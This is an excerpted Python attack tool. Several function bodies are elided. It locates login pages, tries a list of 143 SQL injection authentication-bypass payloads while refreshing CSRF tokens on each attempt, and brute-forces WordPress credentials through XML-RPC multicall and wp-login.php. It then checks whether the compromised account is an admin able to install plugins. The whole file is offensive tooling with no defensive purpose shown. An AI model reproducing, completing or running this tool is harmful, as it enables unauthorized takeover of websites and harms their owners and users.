...
# ─────────────────────────────────────────────────────────────────────────────
#  LOGIN PATHS  (static list — fast first pass)
# ─────────────────────────────────────────────────────────────────────────────
LOGIN_PATHS = [
...
# ─────────────────────────────────────────────────────────────────────────────
#  FORM PARSER  — multi-strategy
#  Handles: name / id / autocomplete / placeholder / type / <label>
# ─────────────────────────────────────────────────────────────────────────────
class FormParser:
...
# ─────────────────────────────────────────────────────────────────────────────
#  LOGIN FINDER  — static paths + homepage spider fallback
# ─────────────────────────────────────────────────────────────────────────────
...
class LoginFinder:
    ...
    def find(self, bu:str):
        # ── Pass 1: static path list ─────────────────────────────────────────
        for path in LOGIN_PATHS:
            info = self._probe(bu+path)
            if info: return info

        # ── Pass 2: homepage spider ──────────────────────────────────────────
        try:
            ...
            if r.status_code == 200:
                ...
                # check meta-refresh / js redirects for ?next= patterns
...
#  Many apps embed a CSRF token in hidden fields that changes every request.
#  Without refreshing it, every SQLi payload gets rejected with "invalid token".
# ─────────────────────────────────────────────────────────────────────────────
...
# ─────────────────────────────────────────────────────────────────────────────
#  SQLI PAYLOADS  — 143 bypass techniques
# ─────────────────────────────────────────────────────────────────────────────
SQLI_PAYLOADS = [
    # ── Classic OR bypass ─────────────────────────────────────────────
    ("' OR '1'='1",                            "' OR '1'='1"),
...
# ─────────────────────────────────────────────────────────────────────────────
#  SQL INJECTOR  — multi-strategy detection
# ─────────────────────────────────────────────────────────────────────────────
class SQLInjector:
    def __init__(self, session):
        self.s     = session
    ...
    def test(self, form:dict):
        ...
        # ── Refresh CSRF tokens once before baseline ──────────────────────────
        form = self.csrf.refresh(form)
        fields = form["fields"]

        # baseline — guaranteed fail
        ...
        for u_pay, p_pay in SQLI_PAYLOADS:
            # Refresh CSRF token for every attempt
            form   = self.csrf.refresh(form)
            fields = form["fields"]
    ...
    def _score(self, resp, baseline, fail_sig,
        ...
        # Signal 1: URL changed to a known admin path
        if _OK_URL_RE.search(resp.url):
            score += 2   # strong signal — counts double

        # Signal 2: Navigated away from login, no error in URL
        if (resp.url != base_url_
...
# ─────────────────────────────────────────────────────────────────────────────
#  WORDPRESS ENGINE  — XML-RPC (strict ET parser) + wp-login.php fallback
# ─────────────────────────────────────────────────────────────────────────────
class WordPressEngine:
    ...
    # ── XML-RPC alive: must return actual method list ────────────────────────
    ...
    # ── XML-RPC brute via system.multicall ──────────────────────────────────
    def xmlrpc_brute(self, bu:str):
        ...
        for i in range(0, len(WP_CREDS), BATCH):
            ...
            if result:
                u, p = result
                # Verify admin + plugin install capability before accepting
    ...
    def _verify_admin_xmlrpc(self, url:str, user:str, passw:str) -> bool:
        ...
        # Check 1: wp.getUsersBlogs - isAdmin flag
        body_blogs = (
        ...
        try:
            ...
            try:
                ...
                if root.find(".//member/name[.='faultCode']") is not None:
                    return False
                # Look for isAdmin boolean = 1 in any blog entry
                is_admin = False
        ...
        # Check 2: wp.getCapabilities - install_plugins
        body_cap = (
            '<?xml version="1.0"?><methodCall>'
    ...
    def _multicall(self, url:str, creds:list):
        ...
        # ── Strict ElementTree parse ─────────────────────────────────────────
        try:
            root = ET.fromstring(r.text.strip())
        except ET.ParseError:
            return None

        # Navigate: methodResponse/params/param/value/array/data
        ...
        for i, val_el in enumerate(results):
            ...
            if is_fault:
                continue
            # Success: contains <array> (blog list, possibly empty)
    ...
    def wplogin_brute(self, bu:str):
        ...
        for user, passw in WP_CREDS:
            ...
            # ── Verify admin + install_plugins capability ─────────────────
            # Merge session cookies so follow-up requests carry auth
            for ck in r.cookies:
    ...
    def _verify_admin_wplogin(self, bu:str) -> bool:
        ...
        """
        # Strategy A: /wp-admin/ - plugin-install.php link present
        try:
            r = self.s.get(
                bu + "/wp-admin/",
                timeout=(TIMEOUT_CONNECT, TIMEOUT_READ),
        ...
        # Strategy B: /wp-admin/plugins.php - broader check
        try:
            r2 = self.s.get(
        ...
        # Strategy C: REST API capabilities
        try:
            r3 = self.s.get(
